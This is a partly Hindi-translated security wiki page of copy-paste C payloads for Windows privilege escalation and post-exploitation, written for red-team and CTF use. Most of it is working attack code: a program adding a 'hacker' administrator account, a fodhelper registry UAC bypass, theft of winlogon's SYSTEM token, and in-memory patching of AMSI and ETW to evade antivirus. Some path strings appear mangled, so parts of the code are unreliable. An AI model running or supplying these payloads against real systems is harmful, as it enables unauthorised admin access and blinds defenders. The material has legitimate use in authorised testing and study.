# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

This page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  ये payloads यह मानते हैं कि प्रक्रिया के पास पहले से ही वह न्यूनतम privileges मौजूद हैं जो क्रिया करने के लिए आवश्यक हैं (उदा. `SeDebugPrivilege`, `SeImpersonatePrivilege`, या medium-integrity context for a UAC bypass)। ये **red-team or CTF settings** के लिए हैं जहाँ किसी vulnerability का फायदा उठाकर arbitrary native code execution प्राप्त हुआ होता है।

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
जब भरोसेमंद बाइनरी **`fodhelper.exe`** चलती है, यह नीचे दिए गए रजिस्ट्री पाथ को **`DelegateExecute` verb को फ़िल्टर किए बिना** क्वेरी करता है। उस कुंजी के अंतर्गत हमारा कमांड रखकर एक हमलावर UAC को *बिना* डिस्क पर फ़ाइल ड्रॉप किए बायपास कर सकता है।

*रजिस्ट्री पाथ जिसे `fodhelper.exe` क्वेरी करता है*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
एक न्यूनतम PoC जो एक elevated `cmd.exe` खोलता है:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 और Windows 11 23H2 (July 2025 patches) पर परीक्षण किया गया। बायपास अभी भी काम कर रहा है क्योंकि Microsoft ने `DelegateExecute` पथ में गायब integrity check को ठीक नहीं किया है।*

---

## टोकन डुप्लिकेशन के माध्यम से SYSTEM shell लॉन्च करें (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
यदि वर्तमान प्रक्रिया के पास **दोनों** `SeDebug` और `SeImpersonate` privileges हैं (कई service accounts के लिए सामान्य), तो आप `winlogon.exe` से token चुरा कर उसे डुप्लिकेट कर सकते हैं और एक elevated process शुरू कर सकते हैं:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## इन-मेमोरी **AMSI** & **ETW** Patch (Defence Evasion)
अधिकांश आधुनिक AV/EDR इंजन दुर्भावनापूर्ण व्यवहारों की जाँच के लिए **AMSI** और **ETW** पर निर्भर करते हैं। वर्तमान प्रक्रिया के भीतर जल्दी दोनों इंटरफ़ेस को पैच करने से स्क्रिप्ट-आधारित payloads (जैसे PowerShell, JScript) को स्कैन किए जाने से रोका जाता है।
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*ऊपर दिया गया पैच process-local है; इसे चलाने के बाद नया PowerShell शुरू करने पर वह AMSI/ETW निरीक्षण के बिना चलेगा।*

---

## बच्चे को Protected Process Light (PPL) के रूप में बनाएं
बच्चे के निर्माण के समय उसके लिए PPL protection level का अनुरोध `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` का उपयोग करके करें। यह एक documented API है और यह केवल तब सफल होगा जब target image अनुरोधित signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) के लिए signed हो।
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
सबसे सामान्य रूप से उपयोग किए जाने वाले स्तर:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Process Explorer/Process Hacker में Protection कॉलम की जाँच करके परिणाम को सत्यापित करें।

---

## संदर्भ
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
